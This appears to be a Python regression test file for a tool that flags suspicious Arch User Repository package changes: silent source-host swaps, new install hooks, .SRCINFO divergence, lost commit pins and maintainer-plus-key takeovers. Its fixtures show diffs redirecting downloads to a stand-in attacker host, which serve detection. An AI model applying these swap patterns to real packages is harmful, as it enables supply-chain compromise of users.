"""Regression tests for the Phase-1 structural rules on the typed core.

- H099: a source entry whose local name survives while the registered
  domain moves, with no version change (the quiet swap: makepkg's cache
  keys on the local name, so nothing refetches and nothing looks new)
- H100: an ``install=`` scalar appearing or retargeting (a root-running
  hook the package did not declare before); HIGH when the hook script
  ships in the same diff, MEDIUM when only the declaration moves
- H092 on the review path: the .SRCINFO/PKGBUILD host comparison used to
  run only on the full-AUR corpus path, so a review never compared the
  metadata against the recipe
"""

from trustsight.analysis.structural import _structural_findings
from trustsight.differ import extract_urls_from_diff


def _rules(diff_text, package_name="demo"):
    return _structural_findings(
        diff_text, extract_urls_from_diff(diff_text), package_name=package_name
    )


_SWAP = """\
--- PKGBUILD
+++ PKGBUILD
@@ -8,3 +8,3 @@
 source=("demo-1.0.tar.gz::https://cdn.good.example.org/demo-1.0.tar.gz"
-        "demo-1.0.tar.gz::https://cdn.good.example.org/demo-1.0.tar.gz"
+        "demo-1.0.tar.gz::https://evil.example.net/demo-1.0.tar.gz"
         "patch.diff::https://cdn.good.example.org/patch.diff")
"""


def test_h099_fires_on_the_quiet_swap():
    hits = [f for f in _rules(_SWAP) if f["rule_id"] == "H099"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "HIGH"
    assert "evil.example.net" in hits[0]["match"]


def test_h099_silent_when_the_version_moved():
    moved = _SWAP.replace(
        "@@ -8,3 +8,3 @@", "@@ -1,5 +1,5 @@\n-pkgver=1.0\n+pkgver=1.1"
    )
    assert not any(f["rule_id"] == "H099" for f in _rules(moved))


def test_h099_silent_on_a_subdomain_of_the_same_registered_domain():
    sub = _SWAP.replace("evil.example.net", "mirror.good.example.org")
    assert not any(f["rule_id"] == "H099" for f in _rules(sub))


def test_h099_silent_when_the_local_name_also_changes():
    renamed = _SWAP.replace(
        '+        "demo-1.0.tar.gz::https://evil.example.net/demo-1.0.tar.gz"',
        '+        "other.tar.gz::https://evil.example.net/other.tar.gz"',
    )
    assert not any(f["rule_id"] == "H099" for f in _rules(renamed))


_HOOK_ADDED = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,3 +1,4 @@
 pkgname=demo
+install=demo.install
 pkgver=1.0
--- /dev/null
+++ demo.install
@@ -0,0 +1,3 @@
+post_install() {
+  true
+}
"""

_HOOK_RETARGETED = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,3 +1,3 @@
 pkgname=demo
-install=old.install
+install=new.install
 pkgver=1.0
"""


def test_h100_high_when_the_hook_script_ships_in_the_same_diff():
    hits = [f for f in _rules(_HOOK_ADDED) if f["rule_id"] == "H100"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "HIGH"


def test_h100_medium_when_only_the_declaration_moves():
    hits = [f for f in _rules(_HOOK_RETARGETED) if f["rule_id"] == "H100"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "MEDIUM"
    assert "old.install" in hits[0]["match"]


def test_h100_silent_when_the_hook_is_untouched():
    quiet = """\
--- PKGBUILD
+++ PKGBUILD
@@ -1,3 +1,3 @@
 pkgname=demo
 install=demo.install
-pkgver=1.0
+pkgver=1.1
"""
    assert not any(f["rule_id"] == "H100" for f in _rules(quiet))


# ---------------------------------------------------------------------------
# H092 on the review path
# ---------------------------------------------------------------------------

_PKGBUILD_1 = (
    "pkgname=demo\n"
    "pkgver=1.0\n"
    "pkgrel=1\n"
    'source=("https://cdn.good.example.org/demo-1.0.tar.gz")\n'
    "sha256sums=('abc123')\n"
)
_PKGBUILD_2 = _PKGBUILD_1.replace("pkgver=1.0", "pkgver=1.0.1").replace(
    "demo-1.0.tar.gz", "demo-1.0.1.tar.gz")
_SRCINFO_DIVERGENT = (
    "pkgbase = demo\n"
    "\tpkgver = 1.0.1\n"
    "\tsource = https://cdn.good.example.org/demo-1.0.1.tar.gz\n"
    "\tsource = https://evil.example.net/payload.tar.gz\n"
    "\tsha256sums = abc123\n"
    "\npkgname = demo\n"
)
_SRCINFO_EQUIVALENT = (
    "pkgbase = demo\n"
    "\tpkgver = 1.0.1\n"
    "\tsource = https://cdn.good.example.org/demo-1.0.1.tar.gz\n"
    "\tsha256sums = abc123\n"
    "\npkgname = demo\n"
)


def _commit(repo, files):
    import pygit2

    sig = pygit2.Signature("T Maintainer", "t@example.invalid")
    builder = repo.TreeBuilder()
    for name, text in files.items():
        builder.insert(name, repo.create_blob(text), pygit2.GIT_FILEMODE_BLOB)
    parents = [repo.head.target] if not repo.is_empty else []
    return str(repo.create_commit("refs/heads/master", sig, sig, "c",
                                  builder.write(), parents))


def _repo(tmp_path, commits):
    import pygit2

    repo = pygit2.init_repository(str(tmp_path / "repo"), bare=True)
    head = ""
    for files in commits:
        head = _commit(repo, files)
    return repo, head


def _analyze(isolated, monkeypatch, srcinfo):
    import trustsight.analysis.pipeline as pipeline

    repo, _ = _repo(isolated, [
        {"PKGBUILD": _PKGBUILD_1},
        {"PKGBUILD": _PKGBUILD_2, ".SRCINFO": srcinfo},
    ])
    monkeypatch.setattr(pipeline, "clone_or_fetch", lambda name, mtime=None: repo)
    return pipeline.analyze_package("demo", installed_version="1.0-1", record=True)


def test_h092_fires_on_the_review_path(isolated, monkeypatch):
    fact = _analyze(isolated, monkeypatch, _SRCINFO_DIVERGENT)
    hits = [e for e in fact.score_breakdown if e.rule_id == "H092"]
    assert len(hits) == 1
    assert "evil.example.net" in hits[0].reason


def test_h092_silent_when_metadata_and_recipe_agree(isolated, monkeypatch):
    fact = _analyze(isolated, monkeypatch, _SRCINFO_EQUIVALENT)
    assert not any(e.rule_id == "H092" for e in fact.score_breakdown)


# ---------------------------------------------------------------------------
# Phase 3: H101 (pinning lost) and H102 (maintainer + keyring composition)
# ---------------------------------------------------------------------------

def test_h101_fires_when_a_commit_pin_becomes_a_branch():
    diff = """\
--- PKGBUILD
+++ PKGBUILD
@@ -5,3 +5,3 @@
 source=(
-        "demo::git+https://github.com/example/demo#commit=0123456789abcdef0123456789abcdef01234567"
+        "demo::git+https://github.com/example/demo#branch=main"
 )
"""
    hits = [f for f in _rules(diff) if f["rule_id"] == "H101"]
    assert len(hits) == 1
    assert hits[0]["severity"] == "MEDIUM"


def test_h101_silent_on_pinned_to_pinned_and_floating_to_floating():
    base = """\
--- PKGBUILD
+++ PKGBUILD
@@ -5,3 +5,3 @@
 source=(
-        "demo::git+https://github.com/example/demo%s"
+        "demo::git+https://github.com/example/demo%s"
 )
"""
    pinned = base % ("#commit=0123456789abcdef0123456789abcdef01234567",
                     "#commit=abcdefabcdefabcdefabcdefabcdefabcdefabcd")
    assert not any(f["rule_id"] == "H101" for f in _rules(pinned))
    floating = base % ("#branch=dev", "#branch=main")
    assert not any(f["rule_id"] == "H101" for f in _rules(floating))


def test_h102_needs_both_members():
    from trustsight.analysis.composition import maintainer_keyring_composition

    both = maintainer_keyring_composition([{"rule_id": "H078"}], True)
    assert both is not None and both["rule_id"] == "H102"
    assert both["severity"] == "HIGH"
    assert maintainer_keyring_composition([{"rule_id": "H078"}], False) is None
    assert maintainer_keyring_composition([], True) is None


_PKGBUILD_KEYS_1 = (
    "# Maintainer: Alice <alice@example.invalid>\n"
    "pkgname=demo\n"
    "pkgver=1.0\n"
    "pkgrel=1\n"
    'source=("https://example.invalid/demo-1.0.tar.gz")\n'
    "sha256sums=('abc123')\n"
    "validpgpkeys=('1111111111111111111111111111111111111111')\n"
)
_PKGBUILD_KEYS_2 = (
    "# Maintainer: Mallory <mallory@example.invalid>\n"
    "pkgname=demo\n"
    "pkgver=1.0.1\n"
    "pkgrel=1\n"
    'source=("https://example.invalid/demo-1.0.1.tar.gz")\n'
    "sha256sums=('def456')\n"
    "validpgpkeys=('2222222222222222222222222222222222222222')\n"
)


def test_h102_fires_on_the_xz_shape(isolated, monkeypatch):
    import trustsight.analysis.pipeline as pipeline

    repo, _ = _repo(isolated, [
        {"PKGBUILD": _PKGBUILD_KEYS_1},
        {"PKGBUILD": _PKGBUILD_KEYS_2},
    ])
    monkeypatch.setattr(pipeline, "clone_or_fetch", lambda name, mtime=None: repo)
    fact = pipeline.analyze_package("demo", installed_version="1.0-1", record=True)
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "H078" in ids, "the member must fire for the composition to see it"
    assert "H102" in ids


def test_h102_silent_when_the_maintainer_stays(isolated, monkeypatch):
    import trustsight.analysis.pipeline as pipeline

    same_maintainer = _PKGBUILD_KEYS_2.replace(
        "# Maintainer: Mallory <mallory@example.invalid>",
        "# Maintainer: Alice <alice@example.invalid>")
    repo, _ = _repo(isolated, [
        {"PKGBUILD": _PKGBUILD_KEYS_1},
        {"PKGBUILD": same_maintainer},
    ])
    monkeypatch.setattr(pipeline, "clone_or_fetch", lambda name, mtime=None: repo)
    fact = pipeline.analyze_package("demo", installed_version="1.0-1", record=True)
    ids = {e.rule_id for e in fact.score_breakdown}
    assert "H078" in ids
    assert "H102" not in ids
